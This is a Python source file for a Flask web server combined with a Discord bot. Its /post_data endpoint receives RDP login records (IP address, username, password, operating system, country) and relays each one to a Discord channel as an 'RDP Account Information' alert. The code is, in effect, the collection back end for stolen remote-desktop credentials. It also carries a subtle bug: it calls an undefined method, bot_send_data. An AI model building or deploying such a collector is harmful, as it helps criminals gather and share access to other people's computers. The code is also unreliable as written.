import random
import threading
import discord
import asyncio

from flask import Flask, request, make_response
from flask_restful import Resource, Api
from discord.ext import commands
from collections import defaultdict
from waitress import serve

host = "0.0.0.0"
port = 80

token_discord_bot = ""
token_website = ""

channel_id_send_data_ori = 1119851938767442020
channel_log = 1120302555382169660
log_message = True

app = Flask(__name__)
app.env = "production"
api = Api(app)
bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

ip_counter = defaultdict(int)
ip_lock = defaultdict(threading.Lock)

activities = [
    discord.Activity(type=discord.ActivityType.watching, name="Cracking the Code"),
    discord.Activity(type=discord.ActivityType.watching, name="github.com/adiyahoo"),
    discord.Activity(type=discord.ActivityType.watching, name="instagram.com/adi_yaksa_nvm"),
]


async def change_activity():
    while True:
        await bot.change_presence(activity=random.choice(activities))
        await asyncio.sleep(60)


@bot.event
async def on_ready():
    await bot.loop.create_task(change_activity())


class DiscordMessage:
    @staticmethod
    async def issue_1(channel_log_obj, ip):
        await channel_log_obj.send(f"Who's trying to hack the website? BTW, here's their IP: ```{ip}```")

    @staticmethod
    async def issue_2(channel_log_obj, error):
        await channel_log_obj.send(f"An error occurred with the code, error information: ```{error}```")

    @staticmethod
    async def issue_3(channel_log_obj, ip):
        await channel_log_obj.send(f"A user attempted to post data without a token: ```{ip}```")

    @staticmethod
    async def issue_4(channel_log_obj, ip):
        await channel_log_obj.send(f"Reached the data post limit, thanks though: ```{ip}```")

    @staticmethod
    async def send_embed(channel, data):
        guild = channel.guild
        owner = guild.owner
        embed = discord.Embed(title="RDP Account Information", color=discord.Color.red())
        embed.add_field(name="💻 Operating System", value=data["os"], inline=False)
        embed.add_field(name="🌐 IP Address", value=data["ip"], inline=False)
        embed.add_field(name="👤 Username", value=data["username"], inline=False)
        embed.add_field(name="🔒 Password", value=data["password"], inline=False)
        embed.add_field(name="🌍 Country", value=data["country"], inline=False)
        embed.set_footer(text="Stay curious and keep exploring. Happy hacking! 😄")
        info_message = f"RDP account info, bro! {owner.mention}"
        await channel.send(content=info_message, embed=embed)


class DiscordBot:
    @staticmethod
    def bot_send_message(data):
        channel = bot.get_channel(channel_id_send_data_ori)
        if channel is not None:
            asyncio.run_coroutine_threadsafe(
                DiscordMessage.send_embed(channel, data), bot.loop
            )
            return True
        else:
            print(f"Channel with ID {channel_id_send_data_ori} not found.")
            return f"Channel with ID {channel_id_send_data_ori} not found.", 404

    @staticmethod
    def bot_send_log(ip, error, issue):
        channel_log_obj = bot.get_channel(channel_log)
        if channel_log_obj is not None:
            if log_message:
                if issue == 1:
                    asyncio.run_coroutine_threadsafe(
                        DiscordMessage.issue_1(channel_log_obj, ip), bot.loop
                    )
                elif issue == 2:
                    asyncio.run_coroutine_threadsafe(
                        DiscordMessage.issue_2(channel_log_obj, error), bot.loop
                    )
                elif issue == 3:
                    asyncio.run_coroutine_threadsafe(
                        DiscordMessage.issue_3(channel_log_obj, ip), bot.loop
                    )
                elif issue == 4:
                    asyncio.run_coroutine_threadsafe(
                        DiscordMessage.issue_4(channel_log_obj, ip), bot.loop
                    )
            else:
                pass
        else:
            print(f"Channel with ID {channel_log_obj} not found.")
            return f"Channel with ID {channel_log_obj} not found.", 404


class Author(Resource):
    def get(self):
        html = """
            <html>
            <head>
                <title>Author Code</title>
                <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
                <style>
                    .card {
                        border-radius: 10px;
                        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    }
                </style>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
            </head>
            <body class="bg-gray-100 flex justify-center items-center h-screen">
                <div class="max-w-md mx-auto bg-white shadow-md rounded p-6 card">
                    <div class="flex justify-center mb-4">
                        <img src="https://avatars.githubusercontent.com/u/136817243?v=4" alt="Profile" class="rounded-full w-24 h-24">
                    </div>
                    <div class="flex items-center justify-center mb-4">
                        <div class="text-center">
                            <h1 class="text-2xl font-bold mb-2">AdiYahoo</h1>
                            <p class="text-gray-600 text-sm">Backend Developer</p>
                        </div>
                    </div>
                    <p class="mb-4">This script code is provided for free and not for sale.</p>
                    <p class="mb-4">"Rankings don't define your true potential. Your ability to code and your passion for it speak volumes about your talent and determination. Embrace your coding skills, continue to learn and improve, and you'll unlock a world of opportunities beyond what any ranking can measure."</p>
                    <div class="flex items-center justify-center mb-4">
                        <i class="fab fa-github text-gray-500 mr-2"></i>
                        <a href="https://github.com/AdiYahoo" class="text-gray-500">GitHub Link</a>
                    </div>
                    <div class="flex items-center justify-center mb-4">
                        <i class="fas fa-envelope text-red-500 mr-2"></i>
                        <a href="mailto:adiyaksa350@gmail.com" class="text-red-500">adiyaksa350@gmail.com</a>
                    </div>
                    <div class="flex items-center justify-center mb-4">
                        <i class="fab fa-instagram text-blue-500 mr-2"></i>
                        <a href="https://www.instagram.com/adiy.aksaaa/" class="text-blue-500">Instagram</a>
                    </div>
                </div>  
                <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/js/all.min.js"></script>
            </body>
            </html>
            """
        response = make_response(html)
        response.headers["Content-Type"] = "text/html"

        return response


class GetData(Resource):
    def post(self):
        ip = request.environ.get("HTTP_X_REAL_IP", request.remote_addr)
        try:
            data = request.get_json()
            if data["token"] == token_website:
                with ip_lock[ip]:
                    ip_counter[ip] += 1
                    if ip_counter[ip] <= 2:
                        check_message = DiscordBot.bot_send_data(data)
                        if check_message:
                            return "Success", 200
                    else:
                        DiscordBot.bot_send_log(ip, None, 4)
                        return "Limit reached, trying to spam?", 403
            else:
                DiscordBot.bot_send_log(ip, None, 1)
                return "Invalid token", 401
        except KeyError as e:
            DiscordBot.bot_send_log(ip, None, 3)
            return f"An error occurred, message: {e}", 500
        except Exception as e:
            DiscordBot.bot_send_log(None, e, 2)
            return f"An error occurred, message: {e}", 500


api.add_resource(Author, "/")
api.add_resource(GetData, "/post_data")


class RunApp:
    @staticmethod
    def run_flask():
        serve(app, host=host, port=port)

    @staticmethod
    def run_discord_bot():
        bot.run(token_discord_bot)


if __name__ == "__main__":
    flask_thread = threading.Thread(target=RunApp.run_flask)
    bot_thread = threading.Thread(target=RunApp.run_discord_bot)

    flask_thread.start()
    bot_thread.start()

    flask_thread.join()
    bot_thread.join()
